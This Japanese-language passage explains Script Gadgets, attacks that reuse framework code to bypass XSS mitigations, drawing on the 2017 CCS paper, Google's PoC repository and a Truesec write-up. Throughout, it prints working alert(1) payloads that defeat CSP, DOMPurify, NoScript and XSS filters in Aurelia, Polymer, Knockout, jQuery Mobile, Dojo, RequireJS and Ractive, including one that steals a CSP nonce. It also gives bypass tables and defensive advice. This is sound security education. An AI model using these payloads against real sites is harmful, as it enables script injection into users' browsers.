2. 現行のXSS対策はそのマークアップに実行可能なスクリプトが無いと判断し、**そのまま通してしまう**。
3. しかしページの寿命の間に、そのサイトのスクリプトガジェットが注入内容を拾い上げ、**意図せずそのペイロードを実行可能なコードへと変換してしまう**。

著者はこれを、メモリ破壊系の脆弱性攻略で使われる **return-to-libc / ROP（Return-Oriented Programming）** に明確になぞらえている。ROPが「バイナリ中に既に存在する実行可能な命令列（gadget）を再利用して任意処理を組み立てる」のに対し、Script Gadgets は「ページ中に既に存在する正規JavaScriptロジックを再利用する」。攻撃者は新しいコードを持ち込まず、**既存コードの正規の振る舞いを鎖のようにつなぐ**だけで任意コード実行に至る。これが「Web版コード再利用攻撃」という呼称の由来である。

> 補足: この攻撃には、初期のHTMLインジェクション口が必要である。それが反射型か格納型か、あるいはサニタイザを通したDOMインジェクションかは**攻撃には無関係**（irrelevant）だと論文は明言する。攻撃者モデルはあくまで古典的なXSS攻撃者、すなわち「対象文書のコンテンツに任意のHTMLを注入できる者」である。

### 2. 前提となる技術背景：DOMセレクタと「無害なHTML」

#### 2.1 なぜガジェットが「トリガー」されるのか

現代のJavaScriptは、`document.getElementById` や `document.getElementsByClassName`、そしてそれらの下敷きである `document.querySelectorAll` を通じて、絶えずDOMからデータを読み込んでいる。これらはすべて **DOMセレクタ**（タグ名 `div`、ID `#foo`、クラス `.foo`、属性 `[foo]`）に基づく。jQuery の `$()` 関数はこのセレクタ言語に大量の糖衣構文を足したものにすぎない。

ライブラリは「特定のセレクタにマッチする要素を見つけて、その属性値に応じて処理する」という設計を当たり前に持つ。例えば「`tooltip` 属性を持つ全要素を装飾する」といった具合だ。攻撃者は、**まさにそのセレクタにマッチする無害な要素**を注入することで、正規コード（ガジェット）に自分の入力を「掴ませる」ことができる。

論文が挙げる、DOMからデータを読む正規コードの典型例（Listing 2 より）:

```js
// ユーザーランドのコード
var button = document.getElementById("button");
button.getAttribute("data-text");

var links = $("a[href]").children();

// Aureliaフレームワークが 'ref' 属性を読む箇所
if (attrName === 'ref') {
  info.attrName = attrName;
  info.attrValue = attrValue;
  info.expression = new NameExpression(
    this.parser.parse(attrValue), 'element',
    resources.lookupFunctions);
}

// Vue.js が v-html 属性を読む箇所
if ((binding = el.attrsMap['v-html'])) {
  return [{ type: EXPRESSION, value: binding }]
}
```

**なぜ動くか**: これらはどれも「攻撃者が注入し得る属性名（`data-text`, `ref`, `v-html`）」を読んでいる。属性値そのものは攻撃者が完全に制御できるので、後段でこの値がコード実行シンク（`innerHTML`、`eval`、`new Function` など）に流れれば、それがガジェットチェーンの入り口になる。

#### 2.2 「無害なHTML（benign HTML）」の定義

論文は、現行の対策が素通しする「無害なHTML」を厳密に定義する。すなわち **`<script>`タグ、インラインイベントハンドラ、`javascript:`/`data:` を持つ `src`/`href`、その他JavaScript実行能力を持つタグ（`<link rel=import>`、`<meta>`、`<style>`）を一切含まないマークアップ**である（Listing 1）:

```html
<div class="greeting">
  <b>Hello</b> world!
</div>
```

対策はこの種のマークアップに「実行可能なスクリプトが無い」と見て無変更で通す。**この「無害であるという判断」こそが攻撃者に悪用される前提**である。

> 出典: Code-Reuse Attacks for the Web — https://acmccs.github.io/papers/p1709-lekiesA.pdf

### 3. スクリプトガジェットの分類（論文 Section 3.5）

論文の最大の貢献の一つは、ガジェットを機能別に分類したことである。多くは単独では実行に至らず、**鎖（chain）**としてつなぐことで初めて有効になる。

#### 3.1 文字列操作ガジェット（String manipulation gadgets）

正規表現・文字置換などで入力文字列を変換するコード。**パターンマッチ型の対策を欺く**のに使える。有名な例が Polymer の「ダッシュ区切り属性名をキャメルケースに変換する」処理（Listing 4）:

```js
dash.replace(/-[a-z]/g, (m) => m[1].toUpperCase())
```

**なぜ動くか**: `inner-h-t-m-l` という属性名を注入すると、この処理が `innerHTML` に復元してしまう。WAFやサニタイザは「`innerHTML`」という危険な文字列を探すが、`inner-h-t-m-l` はそのブラックリストに引っかからない。ガジェットが「安全に見える文字列」を「危険な文字列」へと変換するため、**文脈破壊文字の検出そのものが無力化される**。

同様の変換は AngularJS のディレクティブ名正規化にも存在する（Listing 5）。`data-` や `x-` の接頭辞を剥がし、`:` `-` `_` に続く文字をキャメルケース化する:

```js
var PREFIX_REGEXP = /^((?:x|data)[:\-_])/i;
var SPECIAL_CHARS_REGEXP = /[:\-_]+(.)/g;
function directiveNormalize(name) {
  return name.replace(PREFIX_REGEXP, '')
    .replace(SPECIAL_CHARS_REGEXP, fnCamelCaseReplace);
}
```

**なぜ動くか**: サニタイザにブロックされる `ng-` 属性の代わりに、許可されがちな `data-ng-` 系の属性を使える。正規化後に AngularJS はそれを `ng-` ディレクティブとして解釈するため、対策の裏をかける。

#### 3.2 要素生成ガジェット（Element construction gadgets）

新しいDOM要素、特に **`<script>` 要素を生成する**コード（Listing 6）:

```js
document.createElement(input)
document.createElement("script")
jQuery("<" + tag + ">")
jQuery.html(input) // input が <script> を含む場合
```

代表格は jQuery の `$.globalEval`。これは新しい script 要素を作り `text` プロパティを設定してDOMに追加＝コードを実行する。要素生成ガジェット（3.1系）とJS実行シンクガジェット（3.4系）を兼ねており、`$.html` など多くのjQueryメソッドから呼ばれるため、**strict-dynamic CSPの突破に極めて有用**（後述4.3）。

#### 3.3 関数生成ガジェット（Function creation gadgets）

`new Function(...)` で新しい関数オブジェクトを作るコード。本体は入力と定数文字列の混合で構成される（Listing 7）。Knockout と Underscore.js の実物:

```js
// Knockout の関数生成ガジェット
var body = "with($context){with($data||{}){return{" +
  rewrittenBindings + "}}}";
return new Function("$context", "$element", body);

// Underscore.js の関数生成ガジェット
source = "var __t,__p='',__j=Array.prototype.join," +
  "print=function(){__p+=__j.call(arguments,'');};\n" +
  source + 'return __p;\n';
var render = new Function(
  settings.variable || 'obj', '_', source);
```

**なぜ動くか**: `new Function` は `eval` と同様に文字列からコードを生成する。`rewrittenBindings` や `source` に攻撃者制御文字列が混ざれば任意コードになる。ただし生成された関数は**別のガジェットが呼び出す**必要がある（単独では実行されない）。

#### 3.4 JavaScript実行シンクガジェット（JavaScript execution sink gadgets）

チェーンの終端。前段からの入力をDOM XSSの実行シンクに流し込む（Listing 8）:

```js
eval(input);
inputFunction.apply();
node.innerHTML = "prefix" + input + "suffix";
jQuery.html(input);
scriptElement.src = input;
node.appendChild(input);
```

最も単純なガジェットの例（Listing 3）はこれ一行で成立する:

```js
var button = getElementById("my-button");
button.innerHTML = button.getAttribute("data-text");
```

**なぜ動くか**: `data-text` 属性から読んだ値を無検証で `innerHTML` に代入している。`data-text="<img src=x onerror=alert(1)>"` を仕込むだけで実行に至る。

#### 3.5 式パーサ内のガジェット（Gadgets in expression parsers）— 最強のクラス

Aurelia、AngularJS、Polymer、Ractive.js、Vue.js といった**テンプレート系フレームワーク**は、DOMツリーの一部をUIコンポーネントのテンプレートとして解釈し、`${...}` や `{{...}}` のような区切り記号で囲まれた**独自の式言語（expression language）**を評価する。例えば Aurelia の式（Listing 9）:

```html
<td>${customer.name.capitalize()}</td>
```

フレームワークはこの式を **AST（抽象構文木）にパースして評価**する。ここが致命的なのは、**これら式言語がすべてチューリング完全**である点だ。攻撃者は式言語の表現力を使い、**プロトタイプチェーンを辿ってオブジェクトのコンストラクタや `window` オブジェクトへの参照を取得**し、任意関数を呼べる。Aurelia の式パーサのガジェット実物（Listing 10、簡略版）:

```js
if (this.optional('.')) { // プロパティアクセス
  result = new AccessMember(result, name);
}
AccessMember.prototype.evaluate = function(...) {
  return instance[this.name];
};
if (this.optional('(')) { // 関数呼び出し
  result = new CallMember(result, name, args);
}
CallMember.prototype.evaluate = function(...) {
  return func.apply(instance, args);
};
```

これらを鎖状につなぐと、**無害なHTMLマークアップだけ**で `window.alert` などの任意関数を呼べる。Aurelia を狙う実物のペイロード（Listing 11）:

```html
<div ref=me
 s.bind="$this.me.ownerDocument.defaultView.alert(1)"
></div>
```

**なぜ動くか**: Aurelia は文書内の `ref` 属性と `*.bind` 属性を探してガジェットを起動する。`ref=me` で自要素への参照を `me` に束縛し、`s.bind` の式で `me`（この `<div>`）から `.ownerDocument.defaultView`（＝`window`）を辿り、`alert(1)` を呼ぶ。`<script>` も `eval` も `javascript:` も一切使っていない。式言語のプロパティ辿りだけで `window` に到達している点が肝である。

Polymer 1.x を狙うペイロード（Listing 12）:

```html
<template is=dom-bind><div
 c={{alert('1',ownerDocument.defaultView)}}
 b={{set('_rootDataHost',ownerDocument.defaultView)}}>
</div></template>
```

**なぜ動くか**: 著者は手動コード解析により、Polymer 1.x で **`_rootDataHost` という「私的」プロパティを上書きすると、式を別スコープで実行できる**ことを発見した。このプロパティは本来Polymer式からアクセスされることを想定していない「意図せぬガジェット（unintentional gadget）」である。`set()` で `_rootDataHost` を `window` に差し替え、後続のガジェットチェーンを別スコープで発火させている。

#### 3.6 ガジェットベース攻撃の表現力

論文は、ガジェット経由で**チューリング完全な任意コード**を実行する3つの道を整理する。

- **eval系関数の呼び出し**: `eval` や `new Function` を呼べれば任意実行は直截。`window.alert` を1引数で呼べる例なら、同じ手口で `window.eval` も呼べる。
- **script要素の追加**: 攻撃者制御の `src` または本体を持つ `<script>` を追加する。
- **式言語の表現力の悪用**: CSPの一部の変種（nonceのみ、hashのみ）では上記2つが使えない。その場合でも式言語自体がチューリング完全なので、式インタプリタを起動できれば式言語と同等の表現力を得られる。

### 4. 4大XSS対策の具体的な突破（論文 Section 4）

論文は対策を「戦略」で3分類する。**(1) リクエストフィルタリング**（リクエストがアプリに届く前に遮断＝NoScript、WAF）、**(2) レスポンスサニタイズ**（レスポンス中の悪性コードを検出・除去＝HTMLサニタイザ、IE/EdgeのXSSフィルタ）、**(3) コードフィルタリング**（実行直前に良性/悪性を判定＝CSP、ChromeのXSS Auditor）。ガジェットはこの**どの戦略も原理的に回避する**。

#### 4.1 リクエストフィルタリング（NoScript / WAF）の突破

これらは `<script>` や `onerror` のような**既知の攻撃文字列**や文脈破壊文字（`<` `>`）を列挙して検出する。ガジェットは `class` や `id`、`data-*` のような**無害とされる属性**しか使わないため検出をすり抜ける。Knockout を使い NoScript を破る例（Listing 13）:

```html
<iframe src="//knockout.example.com/?xss=
    <div data-bind=value:a=location></div>
    <div data-bind=value:a.href=name></div>"
  name="javascript:alert(1)"></iframe>
```

**なぜ動くか**: NoScript は `location.href=name`（`name` は攻撃者が設定可能なので危険）を攻撃と判定する。しかしフレームワークの表現力を使い、これを `a=location` と `a.href=name` の**2つの無害な式に分割**している。個々には無害だが、Knockout が両方を評価するとき合わさって「`location.href` を `name`（`javascript:alert(1)`）に設定」となる。NoScript はマークアップを解析して「この2つが一緒に実行される」ことまでは見抜けない。

#### 4.2 レスポンスサニタイズ（DOMPurify / Closure / IE-Edge）の突破

サニタイザはホワイトリストで安全なタグ・属性を列挙し、それ以外を除去する。しかし `data-*`・`id`・`class` は大抵許可される。jQuery Mobile を使い DOMPurify を破る例（Listing 14。IEのXSSフィルタにも有効）:

```html
<div data-role=popup id='-->
  &lt;script&gt;alert(1)&lt;/script&gt;'>
</div>
```

**なぜ動くか**: DOMPurify から見れば、これは `data-role` と `id` を持つ完全に安全な `<div>` である。ところが jQuery Mobile は `data-role=popup` の要素を見つけると、**その `id` を使ってHTMLコメントを自動的に注入する**。攻撃者は `id` 値の中の `-->` でそのコメントから脱出し、その後の（HTMLエンティティが復元された）`<script>` を実行させる。サニタイザは「サニタイズ後は安全」と判断するが、ライブラリのその後の処理が安全性を壊す。

#### 4.3 コードフィルタリング（CSP / XSS Auditor）の突破 — 最重要

論文は「コードフィルタリングこそガジェットに**最も脆弱**」と結論する。ガジェットは正規コードの一部なので、実行時のコード検査をすり抜けるのは当然だからだ。

**XSS Auditor（Chrome/Safari）**: 16フレームワーク中13で突破。多くのガジェットが伝統的DOM XSSシンクを使い、DOM XSS防御がAuditorの既知の弱点だったため。Dojo の例（Listing 15）:

```html
<div
  data-dojo-type="dijit/Declaration"
  data-dojo-props="}-alert(1)-{">
</div>
```

**なぜ動くか**: Dojo は `data-dojo-props` 属性の値を `eval` に渡す。`}-alert(1)-{` は Dojo がオブジェクトリテラルに埋め込むと `eval` 内で `alert(1)` が評価される形になる。ペイロードは（リクエスト中のスクリプトと一致しないので）Auditorのマッチングを逃れる。

**unsafe-eval CSP**: 16中10で突破。式パーサのガジェットか eval系ガジェットを使う。通常 `unsafe-eval` は「攻撃者が直接 `eval` への注入口を見つけるのは難しい」ためそこそこ安全と信じられてきたが、ガジェットは **DOMノードとして注入した内容を eval-gadget に評価させる**という間接経路を提供する。著者はクロール中に**意図せず Tumblr の unsafe-eval ポリシーを自動突破してしまった**と報告している。

**strict-dynamic CSP**: 16中13で突破（うち2つは `unsafe-eval` の併存に依存）。`strict-dynamic` は「nonce付きで信頼されたスクリプトが動的に生成した子スクリプトへ、信頼を自動伝播する」キーワードである。RequireJS の例（Listing 16）:

```html
<script data-main='data:1,alert(1)'></script>
```

**なぜ動くか**: `<script>` に `data-main` 属性があるため、RequireJS のガジェットが `src` を `data:,alert(1)` に向けた**新しいscript要素を生成**する。RequireJS 自体は既に信頼されているので、`strict-dynamic` が**その信頼を新要素に伝播**させ、`data:` スクリプトが実行される。著者は「多くのフレームワークにガジェットが遍在する以上、strict-dynamic で現代Webアプリを守るのは従来考えられていたほど有効ではない」と述べる。Facebook の `fbevents.js` にも strict-dynamic 突破ガジェットを検出したと報告している。

**nonce/hash/whitelist のみの強いCSP**: これらでも**式パーサ内ガジェット**は有効。`eval` も新script要素も使わず `window` を取って任意関数を呼ぶため、CSPには検出・遮断のしようがない（Aurelia・Vue.js・Polymer 1.x で確認）。さらに Ractive では **CSP nonce を盗み出して新scriptに再利用する**ガジェットを発見（Listing 17）:

```html
<script id='template' type='text/ractive'>
<iframe srcdoc='<script
  nonce={{@global.document.currentScript.nonce}}>
  alert(document.domain)
</{{}}script>'>
</iframe>
</script>
```

**なぜ動くか**: Ractive のテンプレート式 `{{@global.document.currentScript.nonce}}` が**現在実行中スクリプトの正規nonceを読み取り**、それを `srcdoc` 内の新しい `<script>` に付与する。nonceが正しいのでCSPは信頼して実行する。`</{{}}script>` は式評価で `</script>` になり、外側のscriptを閉じないための小技。**nonceのみの「強い」CSPすら破られる**ことを示す決定的な例である。

### 5. 実証実験：どれほど蔓延しているか（論文 Section 5）

著者は「ガジェットが稀ならライブラリ側の注意で済むが、蔓延していればXSS自体を直すのと同じくらい難しい問題だ」という問いを立て、**大規模自動計測**を行った。

#### 5.1 検出手法

- **大規模検出**: ブラウザベースの**動的テイント追跡（taint tracking）エンジン**を自作。DOMノードから `eval`・`innerHTML`・`document.write`・`XMLHttpRequest.open()` など**60種類以上のシンク**へのデータフローを報告する。DOMツリー全体を「汚染済み」とマーク（＝反射型HTMLインジェクション能力の模擬）し、汚染値がシンクに届くかを見る。
- **検証（偽陽性ゼロ方式）**: フローが実際に無害マークアップから悪用可能かを、**検証用関数 `verify()` を呼ばせる実exploit**を生成して確かめる。ペイロードは既定では実行されない形に加工する。例えば `<svg onload=verify()>` を `data-text` 属性に**HTMLエンコードして**格納し（Listing 20）、ガジェットが読み取って復元・実行したときだけ `verify()` が発火する:

```html
<div id="button"
    data-text="&lt;svg onload=verify()&gt;">
</div>
```

さらに、CSPが無くても直接実行してしまう**偽陽性を避けるため**、`<xmp>` などの非実行タグを使う工夫もした（Listing 22）:

```html
<xmp id="foo"><script>verify()</script></xmp>
```

**なぜこう作るか**: これにより「ガジェットが読んで復元して初めて実行される」ケースだけをカウントできる。極めて保守的で偽陽性ゼロだが、その代償として**検出できないケース（偽陰性）が増える**ため、得られた数値はすべて**下限（lower bound）**である。

#### 5.2 主要な数値

Alexa 上位5000サイトを起点に、同一ドメイン/サブドメインへの一次リンクを辿り **647,085ページ**をクロール（37,232サブドメイン、4,557セカンドレベルドメインを含む）。

| 計測項目 | 数値 |
|---|---|
| 総シンク呼び出し数（DOM由来データ付き） | **4,352,491回** |
| DOM内のユニークなソース数 | 4,889,568 |
| 1URLあたり平均シンク呼び出し | 7.67回 |
| 何らかの関連データフローを持つドメイン割合 | **81.85%** |
| JS実行関数で終わるフローを持つドメイン（unsafe-eval関連） | **47.76%** |
| script要素生成/src注入系フローを持つドメイン（strict-dynamic関連） | **73.03%** |
| HTML属性→シンクのフローを持つドメイン | 78.30% |
| うち `data-*` 属性由来 | 59.51% |
| `id` 属性由来 / `class` 属性由来 | 15.67% / 10% |
| 生成した exploit 候補 | 1,762,823件 |
| **検証済みガジェット** | **285,894件** |
| **ガジェットを検証できたドメイン** | **906ドメイン＝全体の 19.88%** |

論文が16フレームワークを手動解析した結果の対策別突破本数（Table 1）:

| CSP whitelist | CSP nonce | unsafe-eval | strict-dynamic | Chrome XSS | Edge XSS | NoScript | DOMPurify | Closure | ModSecurity |
|---|---|---|---|---|---|---|---|---|---|
| 3 | 4 | 10 | 13 | 13 | 9 | 9 | 9 | 6 | 9 |

**読み方**: コードフィルタリング系（strict-dynamic 13、Chrome XSS Auditor 13、unsafe-eval 10）が最も破られやすい。**16フレームワーク中13で strict-dynamic を突破**できたことが、「nonce + strict-dynamic こそ現代CSPの本命」という当時の楽観への強い反証となった。一方、実証実験では自動検出可能なシンク終端型ガジェットに絞ったため、**19.88%のドメインで完全動作するexploitを生成・検証**できた（これも下限値）。

### 6. Google `script-gadgets` PoC リポジトリ

論文の攻撃を再現できる形で公開されたのが GitHub の **`google/security-research-pocs` 内 `script-gadgets` ディレクトリ**である（2023年1月10日にアーカイブ＝読み取り専用化）。

#### 6.1 構成

- 著者: Sebastian Lekies、Eduardo Vela Nava、Krzysztof Kotowicz（Google）。
- 収録資料: AppSec EU 2017 スライド、Black Hat USA 2017 スライド（`Breaking_XSS_mitigations_via_Script_Gadgets_BHUSA.pdf`）、CCS'17 論文本体（`ccs_gadgets.pdf`）。
- 実行環境: PHP対応のHTTP(S)サーバ（Apache2 + mod_php）。仮想ホスト `victim.example.com` と `attacker.example.com` を同一ディレクトリで提供する。一部ペイロードは ModSecurity や TLS証明書（LetsEncrypt）を要する。
- **突破する対策ごとにディレクトリ整理**されている。例: `/repo/csp/sd/` が strict-dynamic 突破、`/repo/csp/ue/` が unsafe-eval 突破。各ディレクトリの `*-exploit.*` ファイルが1フレームワーク分。例えば `/repo/csp/ue/aurelia_exploit.php` は「Aureliaで unsafe-eval CSP を破る」PoC。
- 突破一覧は `bypasses.md`。

#### 6.2 フレームワーク別 突破マトリクス（bypasses.md）

各セルは「そのフレームワークのガジェットで、その対策を突破できる」ことを示す。原典のPoC付き一覧を要約する（✔＝突破あり、-＝不可/条件付き）。

| フレームワーク | CSP whitelist | CSP nonce | unsafe-eval | strict-dynamic | Chrome | Edge | NoScript | DOMPurify | Closure | ModSecurity |
|---|---|---|---|---|---|---|---|---|---|---|
| Vue.js 2.3.0 | | | ✔ | ✔(u-e) | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| Aurelia (2017-03-21) | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| Angular 1.6.1 | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| Polymer 1.7.1 | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | -(`<template`) | -(`<template`) | ✔ |
| Underscore 1.8.3 / Backbone | | | ✔ | - | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| Knockout 3.4.1 | | | ✔ | ✔(u-e) | ✔ | ✔ | ✔ | ✔ | -(data-/comments) | ✔ |
| jQuery Mobile 1.4.5 | - | - | ✔ | ✔ | ✔ | ✔ | | ✔ | ✔ | ✔ |
| Ember.js 2.10.2 | - | - | ✔(dev) | ✔(dev) | | | | | | |
| React | - | - | | | | | | | | |
| Closure | | | | ✔ | ✔ | -(`<a.*`) | ✔ | | | |
| Ractive 0.8.1 | -(`{{}}`はeval) | ✔ | ✔ | ✔ | ✔ | -(`<script`) | -(scriptノード) | -(script) | -(script) | -(script) |
| Dojo 1.12.2 | | | ✔ | | ✔ | ✔ | ✔ | ✔ | -(data-) | ✔ |
| RequireJS 2.3.2 | | | | ✔ | ✔ | -(`<script`) | | | | |
| jQuery 3.1.1 | - | - | | ✔ | | -(`<script`) | | | | |
| jQuery UI 1.12.1 | - | - | | ✔ | ✔ | | ✔ | ✔ | ✔ | ✔ |
| Bootstrap 3.3.7 | | | | ✔ | ✔ | ✔ | -(HTML in attr) | ✔ | | |

**この表から読み取るべきこと**:

- **Aurelia と Angular 1.6.1 は全対策を突破**（式パーサ由来の最強クラスのガジェットを持つため）。whitelist/nonceのみの強いCSPすら破れるのは、この式パーサガジェットの威力を示す。
- **React だけが突破例ゼロ**。理由は、Reactが**JSXでコンパイル済みの仮想DOMを使い、HTML文字列やDOM属性を式言語として解釈しない設計**だからである。DOM属性から実行に至る「意味の再解釈」経路を持たないアーキテクチャが、構造的にガジェットを生みにくいことを端的に示す（設計上の重要な教訓）。
- Polymer が DOMPurify/Closure で `-` なのは、両サニタイザが `<template>` を（当時）サポートせず除去するため。Ractive が多くの列で `-` なのは、そのガジェットが `<script>` ノードを要し、それらの対策に除去されるため。つまり**「バージョンと対策の組み合わせ」で成否が決まる**点に注意。
- 対象バージョンはすべて2016〜2017年頃のもの。これらは古い版であり、後継版（Angular 2+/Vue 3 等）や各サニタイザの更新で状況は変わり得る。本表はあくまで**論文発表時点（2017年）のスナップショット**として読むこと。

> 出典: google/security-research-pocs — script-gadgets — https://github.com/google/security-research-pocs/tree/master/script-gadgets

### 7. 防御：論文の結論と実務的な指針

論文（Section 6）は、対策を3方向で論じつつ、いずれも決定打にならないと率直に述べる。

1. **対策技術を直す（Fix the Mitigation）**: 全ガジェットに対応するのは困難。式言語・フレームワーク・ユーザーランドコードのバリエーションが多すぎる。ただし部分的には可能で、**HTMLサニタイザが `data-*`・`id`・`class` 属性をフィルタする**ことは有効な一歩だと提案する（実証実験で `data-` 由来フローが59.51%あったことが根拠）。
2. **アプリ/ライブラリを直す（Fix the Applications）**: ライブラリからガジェットを除去する。しかしガジェットの多くはフレームワークの**機能そのもの**であり開発者が消したがらない。加えて「意図せぬガジェット（`_rootDataHost` の例）」は発見が普通のXSSより難しく、**XSS自体を直すのと同じくらい大変**だと結論。
3. **緩和（mitigation）から隔離・予防（isolation & prevention）へ発想を転換**: 論文の最終提言。Sandboxed iframe、Suborigins、Isolated Scripts などの**隔離技術**と、そもそも脆弱性を書けなくする**安全な既定API（secure-by-default）**へ舵を切るべきだとする。「Webプラットフォームは本質的に危険であり、初心者が安全なアプリを作れる仕組みが必要」という主張は、後年の **Trusted Types**（本書 s8a で扱う）や CSP の強化提案へと繋がっていく。

#### 実務者へのまとめ

- **CSP を貼っただけ、サニタイザを通しただけでは安全ではない。** ページ上に動いている全ライブラリの「DOM属性をコードとして再解釈する挙動」まで含めて脅威モデルに入れること。
- **`unsafe-eval` と `strict-dynamic` はCSPを大きく弱める**（論文は "considerably weaken a CSP policy" と明言）。使うなら細心の注意を。
- サニタイザ設定では、**`data-*`・`id`・`class` を無条件に許可しない**ことを検討する。フレームワーク（Angular/Vue/Polymer 等）を使うページでは、これらが式・ディレクティブの入り口になり得る。
- 新規開発では、**DOM属性やHTML文字列を式言語として解釈しないアーキテクチャ**（React系のコンパイル型、あるいは Trusted Types による実行シンクの型強制）を選ぶこと自体が、ガジェット面積を根本的に減らす。

> 本節ではラボの攻略手順そのものは扱わない。原理の理解と防御設計への応用を目的とする。掲載したコードは、論文・PoCが公開している「なぜ現行対策が原理的に破られるか」を説明するための引用であり、対象バージョン（2016〜2017年頃）における研究成果である点に留意すること。

> 出典: Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets (ACM CCS 2017) — https://acmccs.github.io/papers/p1709-lekiesA.pdf

---

## CSPバイパス実例（Truesec / PortSwigger nonce）

CSP（Content Security Policy）は「どこから読み込まれたスクリプトなら実行してよいか」をブラウザに指示するHTTPレスポンスヘッダーです。厳格に設定すれば、攻撃者が`<script>`タグをHTMLインジェクションで注入しても、そのスクリプトのソース（`src`属性やインラインコード）がポリシーの許可リストに載っていない限りブラウザは実行を拒否します。

しかし「CSPが設定されている」ことと「XSSが起きない」ことはイコールではありません。CSPはあくまで**ブラウザが実行時に判定するホワイトリスト機構**であり、ポリシーが許可している既存の正規スクリプト（jQueryなどの一般的なライブラリ、あるいはサイト自身が読み込んでいるJavaScript）の**内部ロジックを乗っ取って攻撃者の狙い通りに動かす**ことができれば、CSP違反を一切起こさずに任意コード実行に到達できます。このテクニックは「スクリプトガジェット（Script Gadgets）」あるいは「コード再利用攻撃（Code-Reuse Attacks）」と呼ばれ、2017年にSebastian Lekies・Krzysztof Kotowicz・Eduardo Vela Nava らがACM CCSで発表した論文「Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets」で体系化されました。

本節では、この考え方を実例で示すTruesecのブログ記事と、実際にPortSwigger自身のサイトで見つかったnonceベースCSPのバイパス事例を通して、「CSPがあっても壊れる仕組み」を掘り下げます。

### スクリプトガジェットの基本発想

スクリプトガジェットとは、「攻撃者が直接JavaScriptを注入しなくても、既存の正規コードに特定のDOM状態（要素・属性・テキスト）を与えるだけで、そのコードが代わりにJavaScriptを実行してくれる」ような処理のことです。バイナリ解析の世界でいう「ROP（Return-Oriented Programming）ガジェット」のWeb版だと考えると理解しやすいでしょう。攻撃者は新しい命令（コード）を注入するのではなく、既にメモリ（この場合はページ内の正規スクリプト）に存在する命令列を、入力データで無理やり組み合わせて悪用します。

ガジェットは大まかに次のように分類されます。

- **文字列操作ガジェット**: 属性値やテキストをそのままevalやinnerHTMLに渡してしまう処理
- **要素構築ガジェット**: ユーザー入力を元にDOM要素を組み立てる際、エスケープが不十分な処理
- **関数生成ガジェット**: `new Function()`やテンプレートエンジンの式評価器
- **実行シンク**: 最終的に`eval`・`setTimeout(string)`・`Function`コンストラクタなどJavaScriptとして解釈させる箇所

CSPがブロックするのは「攻撃者が新しく持ち込んだスクリプト」であって、「サイトにもとから存在し許可された正規スクリプトが、汚染されたデータをもとに実行する処理」ではありません。ここに抜け道が生まれます。

### Truesecの実例：jQuery Mobile Popup Widgetを使ったコード再利用攻撃

Truesecのブログ記事は、この「ガジェット」の考え方を具体的なjQuery Mobileの脆弱な処理を使って再現したものです。

> 出典: Bypassing modern XSS mitigations with code-reuse attacks — https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks

#### 前提となるCSP設定

記事で例示されているCSPは次のようなものです。

```
Content-Security-Policy: script-src 'self' https://code.jquery.com:443 'unsafe-eval'; object-src 'none';
```

これは一見厳しく見えます。攻撃者が任意のドメインからスクリプトを読み込むこと（外部の`evil.com/x.js`のようなURL）はブロックされますし、`object-src 'none'`によってFlash等を使ったプラグイン系のバイパスも塞がれています。しかし`https://code.jquery.com`という**CDN経由の正規ライブラリ**が許可リストに載っている点がポイントです。攻撃者はこのjQuery自身（あるいはjQuery Mobile）のコードを「踏み台」として使います。

#### 脆弱な処理：Popup Widgetのid出力

jQuery Mobileには`data-role="popup"`でポップアップUIを生成するウィジェットがあります。このウィジェットは、指定された`id`属性の値を、内部的にHTMLコメントとして書き出す処理を持っていました（ポップアップの一意な識別・後方互換のためのマークアップ生成ロジックの一部です）。ここでの核心的な問題は、`id`属性の値が**エスケープされずにHTMLコメントの内側にそのまま書き込まれる**ことです。

HTMLコメントは`<!--`で始まり`-->`で終わります。攻撃者が`id`属性の値の中に`-->`という文字列を仕込めば、生成されたHTMLの中でコメントがそこで**強制終了**し、それ以降に続けて書いた文字列は通常のHTMLとしてパーサに解釈されます。これは「パーサの再解釈（コンテキストブレイクアウト）」の典型例です。ペイロードは次のようになります。

```html
<div data-role="popup" id="--!><script>alert(1)</script>"></div>
```

これをHTMLインジェクション（たとえば反射型XSSの脆弱なパラメータや、掲示板のような場所へのマークアップ注入）で流し込むと、jQuery Mobileのポップアップ初期化コードが`id`属性値をそのままコメント文字列に埋め込みます。結果として生成されるHTML断片は概ね次のような形になります。

```html
<!-- id: --!><script>alert(1)</script> -->
```

`-->`の直前に`--`が既にあるため、パーサ的には`id: --` + `!>` の時点でコメントが終了し、続く`<script>alert(1)</script>`が独立したscript要素としてDOMに現れます。ここで挿入されるのはインラインの`<script>`タグですが、これは**攻撃者が最初から用意していたペイロード文字列がjQuery Mobileの正規コードによってDOMに書き込まれた結果**であり、jQuery自体（`code.jquery.com`）はCSPで許可済みのソースとして実行されます。つまりCSPの`script-src`ディレクティブに違反する新規外部スクリプトの読み込みは一切発生せず、既存の許可されたスクリプト（jQuery Mobile本体）が、汚染された`id`値というデータを経由して攻撃者の望むDOM操作（scriptタグの挿入）を代行してくれるわけです。

記事ではさらに前段として、シンプルな`img`要素のonerrorガジェットも紹介されています。

```html
<img src="n/a" onerror="alert('XSS')"/>
```

これ自体はCSPが`script-src`でインラインイベントハンドラをブロックしていれば通常は動きません（`unsafe-inline`が無い限りイベントハンドラ属性はCSP違反になります）。Truesecの主張は、こうした素朴なペイロードが弾かれる状況でも、ライブラリの内部ロジックというもう一段深い「実行経路」を使えば、CSPが想定していない形でコードが実行されるということです。

#### 影響を受けたバージョンと位置づけ

記事および関連する2017年のLekiesらの原論文では、検証対象として**jQuery 1.8.3およびjQuery Mobile 1.2.1**が例示されています。より重要なのは個別のバージョンそのものよりも、この研究が調査対象とした**16の広く使われているJavaScriptライブラリのほぼすべてに、複数のスクリプトガジェットが存在した**という事実です。つまり「今使っているライブラリのこのバージョンさえ避ければ安全」という単純な話ではなく、複雑なDOM操作ロジックを持つライブラリ全般に共通するリスクだと理解する必要があります。この種の問題は個別のCVE番号で管理されるというより、「XSSフィルタ／CSP／サニタイザのバイパス手法そのもの」として研究コミュニティに認識されています。

